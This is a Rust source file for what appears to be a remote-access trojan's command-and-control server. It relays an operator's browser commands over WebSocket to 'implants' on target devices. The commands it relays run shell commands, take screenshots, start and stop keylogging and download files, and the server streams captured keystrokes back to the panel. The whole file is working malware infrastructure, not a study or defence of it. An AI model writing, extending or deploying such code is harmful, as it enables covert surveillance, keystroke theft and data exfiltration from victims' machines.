// src/ws/frontend.rs
//
// Handles connections from the admin browser UI (one socket per device page).
// Route mounted at: /ws/frontend/{device_id}?token=<JWT>
//
// On connect the server immediately sends a status frame:
//   { "type": "status", "connected": true|false, "device_id": "…" }
//
// Browser sends commands:
//   { "id": "<uuid>", "type": "cmd",          "data": "whoami"   }
//   { "id": "<uuid>", "type": "shell",        "data": "dir C:\\" }
//   { "id": "<uuid>", "type": "screenshot"                       }
//   { "id": "<uuid>", "type": "keylog_start"                     }
//   { "id": "<uuid>", "type": "keylog_stop"                      }
//   { "id": "<uuid>", "type": "download",     "data": "C:\\…"   }
//
// Server replies:
//   { "type": "response", "id": "…", "ok": true,  "data": "…"  }
//   { "type": "response", "id": "…", "ok": false, "error": "…" }
//
// Implant push events arrive automatically:
//   { "type": "event", "event": "keylog", "data": "…"           }
//   { "type": "event", "event": "alert",  "level": "…", "message": "…" }
//   { "type": "status", "connected": false, "device_id": "…"   }  (implant dropped)

use super::shared::{FrontendMsg, to_json};
use crate::{auth::Claims, state::AppState};
use axum::{
    Router,
    extract::{
        ConnectInfo, Path, Query, State,
        ws::{Message, WebSocket, WebSocketUpgrade},
    },
    response::IntoResponse,
    routing::get,
};
use serde::Deserialize;
use std::net::SocketAddr;
use tokio::sync::mpsc;
use tracing::{info, warn};

pub fn router() -> Router<AppState> {
    Router::new().route("/{device_id}", get(ws_handler))
}

// ── Auth query param ──────────────────────────────────────────────────────────

#[derive(Deserialize)]
struct AuthQuery {
    token: String,
}

// ── Command from the browser ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct BrowserCmd {
    id: String,
    #[serde(rename = "type")]
    kind: String,
    #[serde(default)]
    data: String,
}

// ── Upgrade ───────────────────────────────────────────────────────────────────

async fn ws_handler(
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    Path(device_id): Path<String>,
    claims: Claims,
    State(state): State<AppState>,
    ws: WebSocketUpgrade,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| {
        handle_frontend(socket, addr, device_id, claims, state)
    })
}

// ── Per-connection handler ────────────────────────────────────────────────────

async fn handle_frontend(
    mut socket: WebSocket,
    addr: SocketAddr,
    device_id: String,
    claims: Claims,
    state: AppState,
) {
    info!(
        "Frontend WS: admin={} device={} addr={}",
        claims.sub, device_id, addr
    );

    // Send initial device-online status so the UI knows immediately
    let is_online = state
        .devices
        .read()
        .await
        .get(&device_id)
        .map(|d| d.active)
        .unwrap_or(false);

    let status = to_json(&FrontendMsg::Status {
        connected: is_online,
        device_id: device_id.clone(),
    });
    if socket.send(Message::Text(status.into())).await.is_err() {
        return;
    }

    // Register push channel so the implant handler can deliver events here
    let (push_tx, mut push_rx) = mpsc::channel::<String>(64);
    state
        .frontend_senders
        .write()
        .await
        .entry(device_id.clone())
        .or_default()
        .push(push_tx);

    // ── Multiplex: browser commands + implant push events ─────────────────
    loop {
        tokio::select! {
            frame = socket.recv() => {
                match frame {
                    Some(Ok(Message::Text(raw))) => {
                        dispatch_cmd(raw.trim(), &device_id, &mut socket, &state).await;
                    }
                    Some(Ok(Message::Ping(p))) => {
                        let _ = socket.send(Message::Pong(p)).await;
                    }
                    Some(Ok(Message::Close(_))) | None => break,
                    _ => {}
                }
            }
            Some(push) = push_rx.recv() => {
                if socket.send(Message::Text(push.into())).await.is_err() {
                    break;
                }
            }
        }
    }

    // Remove this push sender from the map (dead channels filtered out)
    info!(
        "Frontend WS closed: admin={} device={}",
        claims.sub, device_id
    );
    let mut map = state.frontend_senders.write().await;
    if let Some(senders) = map.get_mut(&device_id) {
        senders.retain(|tx| !tx.is_closed());
        if senders.is_empty() {
            map.remove(&device_id);
        }
    }
}

// ── Command dispatch ──────────────────────────────────────────────────────────

async fn dispatch_cmd(raw: &str, device_id: &str, socket: &mut WebSocket, state: &AppState) {
    let cmd: BrowserCmd = match serde_json::from_str(raw) {
        Ok(c) => c,
        Err(_) => {
            let msg = to_json(&FrontendMsg::Response {
                id: "?".into(),
                ok: false,
                data: None,
                error: Some("Invalid JSON".into()),
            });
            let _ = socket.send(Message::Text(msg.into())).await;
            return;
        }
    };

    // Build the CMD string the implant expects:
    //   CMD <cmd_id> <verb> [args]
    let implant_cmd = {
        let verb = cmd.kind.as_str();
        if cmd.data.is_empty() {
            format!("CMD {} {}", cmd.id, verb)
        } else {
            format!("CMD {} {} {}", cmd.id, verb, cmd.data)
        }
    };

    // Register one-shot channel so the implant handler can resolve this id
    let (resp_tx, resp_rx) = tokio::sync::oneshot::channel::<String>();
    state
        .pending_cmds
        .write()
        .await
        .insert(cmd.id.clone(), resp_tx);

    // Forward CMD to implant
    let forwarded = {
        let senders = state.implant_senders.read().await;
        match senders.get(device_id) {
            Some(tx) => tx.send(implant_cmd).await.is_ok(),
            None => false,
        }
    };

    if !forwarded {
        state.pending_cmds.write().await.remove(&cmd.id);
        let msg = to_json(&FrontendMsg::Response {
            id: cmd.id,
            ok: false,
            data: None,
            error: Some("Device offline".into()),
        });
        let _ = socket.send(Message::Text(msg.into())).await;
        return;
    }

    // Wait for implant reply (15 s)
    let result = tokio::time::timeout(std::time::Duration::from_secs(15), resp_rx).await;

    let reply = match result {
        Ok(Ok(resp)) => {
            if let Some(data) = resp.strip_prefix("CMD_OK ") {
                to_json(&FrontendMsg::Response {
                    id: cmd.id,
                    ok: true,
                    data: Some(data.to_string()),
                    error: None,
                })
            } else if resp == "CMD_OK" {
                to_json(&FrontendMsg::Response {
                    id: cmd.id,
                    ok: true,
                    data: None,
                    error: None,
                })
            } else {
                let reason = resp.strip_prefix("CMD_FAIL ").unwrap_or(&resp).to_string();
                to_json(&FrontendMsg::Response {
                    id: cmd.id,
                    ok: false,
                    data: None,
                    error: Some(reason),
                })
            }
        }
        _ => to_json(&FrontendMsg::Response {
            id: cmd.id,
            ok: false,
            data: None,
            error: Some("Timeout waiting for device".into()),
        }),
    };

    let _ = socket.send(Message::Text(reply.into())).await;
}
